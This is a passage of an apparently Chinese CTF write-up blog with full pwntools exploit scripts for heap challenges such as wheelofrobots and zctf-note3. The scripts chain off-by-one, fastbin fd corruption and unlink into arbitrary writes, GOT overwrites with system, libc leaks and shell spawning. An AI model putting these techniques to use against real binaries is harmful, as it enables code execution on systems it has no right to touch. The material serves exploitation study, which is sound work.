class="number">0x18</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">    editnote(<span class="number">0</span>, <span class="number">1</span>, payload) </span><br><span class="line">    shownote(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"TheNewContents:Edit note success!\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">    atoi_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"atoi_addr: 0x%x"</span> % atoi_addr)</span><br><span class="line">    libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#get_shell</span></span><br><span class="line">    editnote(<span class="number">0</span>, <span class="number">1</span>, p64(system_addr))</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h2><p>这道题难点我觉得在于代码长了点，然后漏洞点难找了点，其余还好，我自己分析的时候又是一头雾水，只看出free的时候没置空，然后还有的是在change部分，他代销有的居然达到了0x9C40uLL，这里我觉得也是一个点，off-by-one真没看出来</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解</a></p>
<p>我不在分析功能以及漏洞点分析，这次我自己没分析出来，只讲下漏洞利用过程以及过程中踩到的坑</p>
<h3 id="漏洞利用过程-2"><a href="#漏洞利用过程-2" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li>准备部分</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Bender's intelligence: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Robot Devil's cruelty: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Destructor's powerful: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    io.sendafter(<span class="string">"Robot's name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span><span class="params">(byte)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"9999"</span> + byte)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr1, addr2)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(addr1))</span><br><span class="line">    change(<span class="number">6</span>, p64(addr2))</span><br></pre></td></tr></table></figure>

<p><strong>注意：这里change是sendafter不是sendline，因为sendline会发送多一个\n破坏地址</strong></p>
<ol start="2">
<li>off-by-one溢出修改部分</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">off_by_one(<span class="string">'\x01'</span>)</span><br><span class="line"><span class="comment"># change fd pointer</span></span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x0000000000603138</span>))</span><br><span class="line">off_by_one(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pass the fastbin check size=0x20</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#now idx2-&gt;0x603138-&gt;null</span></span><br><span class="line"><span class="comment">#get malloc to -&gt; 0x603138</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">#now 0x603138-&gt;null</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#whell &lt;=2</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>我觉得这部分应该是顺风顺水的吧，off-by-one学过了</p>
<ol start="3">
<li>关键点</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#now only have idx1 pointer-&gt;0x603138 , it's destructor_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#the size must bigger than remove(2) remove(3)'s  size</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line"><span class="comment">#change idx6 size:1000</span></span><br><span class="line">change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">ptr = <span class="number">0x00000000006030E8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x50</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>) <span class="comment">#pre_size</span></span><br><span class="line">payload += p64(<span class="number">0xa0</span>) <span class="comment">#size</span></span><br><span class="line">change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>这里的话，要注意的就是开头申请的两个add了，那个不能低于remove的大小，不然会重新覆盖到那上边去，至于大小是多少，自己构造就好，然后溢出覆盖unlink，常见了</p>
<ol start="4">
<li>修改并泄露地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">change(<span class="number">6</span>, payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">write(elf.got[<span class="string">'exit'</span>], <span class="number">0x0000000000401855</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change robot_wheel to 3</span></span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>, p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">start_robot()</span><br><span class="line"><span class="comment"># leak </span></span><br><span class="line">io.recvuntil(<span class="string">" Thx "</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>
<p>我觉得这部分跟unlink属于同一部分的，重新修改地址，这里是将tinny改成指向destructor的位置处，这样编辑1就可以编辑第6处指针，在编辑第六处就是写入了，相当于任意写<br>写入完后泄露</p>
<ol start="5">
<li>getshell了</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get shell</span></span><br><span class="line">write(elf.got[<span class="string">'atoi'</span>], system_addr)</span><br><span class="line">io.send(<span class="string">"sh;#"</span>)</span><br></pre></td></tr></table></figure>

<p>跟前面套路一样，改掉atoi，然后传入sh就完了，ctf-wiki的改的free</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'wheelofrobots'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'wheelofrobots'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Bender's intelligence: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Robot Devil's cruelty: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Destructor's powerful: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    io.sendafter(<span class="string">"Robot's name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span><span class="params">(byte)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"9999"</span> + byte)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr1, addr2)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(addr1))</span><br><span class="line">    change(<span class="number">6</span>, p64(addr2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    off_by_one(<span class="string">'\x01'</span>)</span><br><span class="line">    <span class="comment"># change fd pointer</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x0000000000603138</span>))</span><br><span class="line">    off_by_one(<span class="string">'\x00'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#pass the fastbin check size=0x20</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line">    <span class="comment">#now idx2-&gt;0x603138-&gt;null</span></span><br><span class="line">    <span class="comment">#get malloc to -&gt; 0x603138</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#now 0x603138-&gt;null</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#whell &lt;=2</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#now only have idx1 pointer-&gt;0x603138 , it's destructor_size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#the size must bigger than remove(2) remove(3)'s  size</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="comment">#change idx6 size:1000</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">    ptr = <span class="number">0x00000000006030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x50</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x50</span>) <span class="comment">#pre_size</span></span><br><span class="line">    payload += p64(<span class="number">0xa0</span>) <span class="comment">#size</span></span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unlink</span></span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    </span><br><span class="line">    write(elf.got[<span class="string">'exit'</span>], <span class="number">0x0000000000401855</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change robot_wheel to 3</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">    change(<span class="number">1</span>, p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">    <span class="comment"># leak </span></span><br><span class="line">    io.recvuntil(<span class="string">" Thx "</span>)</span><br><span class="line">    puts_addr = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    write(elf.got[<span class="string">'atoi'</span>], system_addr)</span><br><span class="line">    io.send(<span class="string">"sh;#"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="zctf-note3"><a href="#zctf-note3" class="headerlink" title="zctf-note3"></a>zctf-note3</h2><p>这道题算自己做的了，自己分析漏洞点，自己做，不过有两个位置卡住了，暂时未得以解决先记录下来，从他人wp里获得的解决方案</p>
<h3 id="功能分析-1"><a href="#功能分析-1" class="headerlink" title="功能分析"></a>功能分析</h3><p>有增删查改，<br>查询部分是没用的，无法泄露</p>
<h3 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>不知道为什么，看到这个读取函数瞬间就懂怎么做了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4008DD</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>a2-1跟我前面做过的一两道题都类似，利用0-1负数，然后转成无符号比较，变成很大，也就是堆溢出</p>
<p><strong>注意：这里的坑点就是a3, a3假设被定为\n，我们sendline的时候sendline(p64(addr))会覆盖到下一个地址的最后一位，并将他改成\x00，这是最坑的点了，我被这个坑了好久</strong></p>
<h3 id="漏洞利用过程-3"><a href="#漏洞利用过程-3" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li>准备工作</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the length of the note content:(less than 1024)\n"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the note content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the new content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br></pre></td></tr></table></figure>

<p>不用多说吧，每道堆题一样的套路</p>
<ol start="2">
<li>unlink部分</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>) <span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>) <span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>) <span class="comment">#idx2</span></span><br><span class="line">ptr = <span class="number">0x6020c8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p><strong>这里有坑，切记，不能删掉idx1在进行覆盖，会报错，至于具体报错原因我不清楚，我估计是fastbin链上修改成了错误的fd指针，检测到了，这个问题待解决</strong></p>
<p>简单的unlink</p>
<ol start="3">
<li>这里我利用了上一道题的思路，一样的做，修改idx0指向idx1指针部分，通过修改idx0，然后达到任意地址写</li>
</ol>
